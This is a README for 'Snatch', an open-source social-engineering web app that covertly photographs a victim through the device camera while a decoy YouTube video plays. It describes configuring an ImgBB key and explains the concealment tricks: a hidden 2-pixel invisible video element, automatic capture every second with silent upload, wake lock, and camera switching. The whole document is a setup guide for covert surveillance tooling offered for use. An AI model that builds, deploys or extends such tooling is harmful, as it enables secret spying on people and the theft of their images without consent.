# Snatch

Snatch is an open-source social engineering web application that allows users to capture images using a victim's device camera and upload them to ImgBB. It is designed to work on modern mobile and desktop browsers and provides simple secretive camera switching and image capture functionality.  

Use `youtube-snatch.netlify.app` to preview! This is just a demo, no actual images have been captured or sent due to the missing API key. 


### Features
- Capture images from device camera
- Switch between front and back cameras (supported mobile devices)
- Upload images to ImgBB
- Works as a web app (no installation required)
- Open-source under the MIT License


## Browser Support 
Snatch works best on:
- Google Chrome (Android / Desktop)
- Microsoft Edge
- Firefox
- Safari (limited support on iOS)
- ⚠️ Camera switching behavior depends on the browser and device. Some devices may not support switching cameras in web apps


## Configuration

> Note: Camera access requires HTTPS or localhost


### 1. Obtain Your ImgBB API Key
Snatch needs an ImgBB API key to upload images
- Create an account at https://imgbb.com
- Get your API key

### 2. Configure Your ImgBB API Key
You can set it in two ways: 

**Option A (Recommended): Using index.html Meta Tag**  
Edit `<meta name="imgbb-key" content="">` and change it to `<meta name="imgbb-key" content="YOUR_API_KEY_HERE">`  
This is read in **app.js** when the app starts

**Option B: Inside JavaScript** (Not Recommended for Public Repos)  
Edit this line in **app.js** (top section) `const DEFAULT_IMGBB_KEY = ' // Paste here ';` and change to `const DEFAULT_IMGBB_KEY = 'YOUR_API_KEY_HERE';`  
⚠️ Do NOT commit real API keys to public repositories!

### 3. Configure the Background Video
Snatch displays a YouTube video in the background. Edit in **index.html**.  
Change the iframe source `<iframe src=" <!-- Paste Here --> ">` and replace with `<iframe src="https://www.youtube.com/embed/VIDEO_ID">`  
Change fallback link `<a href=" <!-- Paste here --> ">` and replace with `<a href="https://youtube.com/watch?v=VIDEO_ID">`. This is used if the iframe fails to load.  

## 🚀 Quick Start

Follow these steps to set up Snatch locally.

### 1. Clone the Repository

```bash
git clone https://github.com/YOUR_USERNAME/snatch.git
cd snatch
```

### 2. Configure ImgBB API Key

Snatch requires an ImgBB API key to upload captured images.

You can get one from:
https://imgbb.com

After generating the key, configure it using one of the methods below.

#### Option A (Recommended)

Edit the meta tag inside `index.html`:

```html
<meta name="imgbb-key" content="YOUR_API_KEY_HERE">
```

#### Option B

Edit the default API key directly inside `app.js`:

```js
const DEFAULT_IMGBB_KEY = 'YOUR_API_KEY_HERE';
```

> ⚠️ Never commit real API keys to public repositories.

### 3. Configure Background Video (Optional)

Inside `index.html`, replace the iframe source:

```html
<iframe src="https://www.youtube.com/embed/VIDEO_ID">
```

Fallback link:

```html
<a href="https://youtube.com/watch?v=VIDEO_ID">
```

### 4. Run the Application

Since camera access requires a secure context, run the app using:

- HTTPS
- localhost

Opening `index.html` directly may block camera access in modern browsers.

You can use:

```bash
npx serve .
```

or VS Code Live Server.

## Functionality
### 1. Running the App Locally
Requirements:
- Modern browser (Chrome, Edge, Firefox, Safari)
- HTTPS or localhost (camera access requires secure context). Opening **index.html** directly may block camera access.

### 2. Starting the Camera & Capture System
When the page loads: **app.js** (DOMContentLoaded section near bottom)  
The app automatically:
- Detects available cameras `(getDevices())`
- Starts the default camera `(startCamera())`
- Begins capture loop `(startCaptureLoop())`
- Enables auto-switching `(startAutoSwitch())`

### 3. Automatic Image Capture
Snatch takes pictures automatically at intervals. It:
- Captures frame `(captureFrameAsBlob())`
- Converts to Base64 `(blobToBase64())`
- Uploads to ImgBB `(uploadToImgbb())`

**Interval is controlled by:** `const captureIntervalInput`  
**Default fallback is:** 1000 ms (1 second)  
**Minimum allowed:** 200 ms  

### 4. Upload Process (ImgBB)
Upload logic is in: **app.js** - `async function uploadToImgbb()`

Process:
- Reads API key
- Creates FormData
- Sends POST request
- Retries up to 3 times
- Returns uploaded image URL

If no API key is found: `setStatus('No imgbb API key configured — skipping upload');` and uploads are skipped.

### 5. Wake Lock (Prevent Screen Sleep)
Snatch can keep the screen awake.

Implemented in: **app.js** - `async function acquireWakeLock()`

Uses: `navigator.wakeLock.request('screen')`
If enabled, the screen will not turn off during capture.

### 6. Camera Preview (Hidden Mode)
Snatch uses a hidden `<video>` element for capturing frames.

Created in: **app.js** - `preview = document.createElement('video');`

Styled to be invisible:  
`preview.style.opacity = '0';`  
`preview.style.width = '2px';`  
This allows background capture without showing UI.

### 7. Stopping the Camera
Camera stops when:
- Page closes
- Tab changes

Handled in: **app.js** - `function stopCamera()` and `window.addEventListener('beforeunload')`

## Troubleshooting
**1. Camera Not Working**  
Check:  
✔️ HTTPS or localhost  
✔️ Browser permissions  
✔️ Secure context  

Detected in: `isSecureContextAllowed()`

**2. Only Front Camera Works**  
This depends on browser support  
Handled in: `cycleCamera()`  
Fallback uses: `facingMode: 'user' / 'environment'`  
Some browsers ignore this.  

**3. Upload Not Working**  
Check:  
✔️ API key is set  
✔️ Network connection  
✔️ ImgBB service status
